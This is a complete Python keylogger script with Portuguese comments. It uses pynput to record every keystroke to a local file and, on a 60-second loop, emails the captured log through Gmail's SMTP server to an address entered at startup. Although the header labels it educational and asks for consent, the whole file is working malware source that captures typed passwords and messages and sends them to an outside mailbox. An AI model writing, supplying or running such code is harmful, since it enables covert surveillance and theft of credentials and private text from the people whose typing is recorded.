# keylogger.py
# Este script é um keylogger simples para fins educacionais.
# Ele captura teclas pressionadas e envia o log por e-mail a cada 60 segundos.
# USE APENAS PARA TESTES E COM CONSENTIMENTO. NÃO PARA ATIVIDADES MALICIOSAS.

import time
import threading
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from getpass import getpass  # Para entrada segura de senha

log_file = "log.txt"

def on_press(key):
    """Função chamada quando uma tecla é pressionada.
    Escreve o caractere no arquivo de log."""
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))  # Escreve o caractere
        print("Tecla capturada: " + str(key.char))  # Depuração: Mostra no terminal
    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            else:
                f.write(f' [{key}] ')
        print("Tecla especial capturada: " + str(key))  # Depuração
    except Exception as e:
        print(f"Erro ao capturar tecla: {e}")  # Captura erros

def on_release(key):
    """Função chamada quando uma tecla é liberada.
    Para o listener se ESC for pressionado."""
    if key == Key.esc:
        return False  # Para o listener

def enviar_email(remetente, senha, destinatario, assunto, corpo):
    """Envia um e-mail com o log capturado."""
    msg = MIMEText(corpo)
    msg['Subject'] = assunto
    msg['From'] = remetente
    msg['To'] = destinatario

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(remetente, senha)
        server.sendmail(remetente, destinatario, msg.as_string())
        server.quit()
        print("E-mail enviado com sucesso!")
    except Exception as e:
        print(f"Erro ao enviar o e-mail: {e}")

def run_listener():
    """Função para rodar o listener em uma thread."""
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()  # Isso bloqueia até ESC ser pressionado

def enviar_log_periodicamente(remetente, senha, destinatario, assunto):
    while True:
        try:
            with open(log_file, "r") as f:
                corpo_do_email = f.read()
            if corpo_do_email:
                enviar_email(remetente, senha, destinatario, assunto, corpo_do_email)
                print("Log enviado por e-mail.")
            else:
                print("Nenhum log capturado ainda.")
        except FileNotFoundError:
            print("Arquivo log.txt não encontrado.")
        except Exception as e:
            print(f"Erro ao ler ou enviar log: {e}")
        
        time.sleep(60)  # Espera 60 segundos

# Início do script: Pergunta as credenciais
print("Configurando o keylogger...")
remetente = input("Digite o e-mail do remetente (ex: seuemail@gmail.com): ")
senha = getpass("Digite a senha do app do e-mail: ")
destinatario = input("Digite o e-mail para receber o log: ")
assunto = input("Digite o assunto do e-mail: ")

# Inicia o listener em uma thread separada
listener_thread = threading.Thread(target=run_listener)
listener_thread.start()

# Inicia o loop de envio na thread principal
print("Keylogger iniciado. Ele enviará o log a cada 60 segundos. Pressione ESC para parar o keylogger.")
enviar_log_periodicamente(remetente, senha, destinatario, assunto)
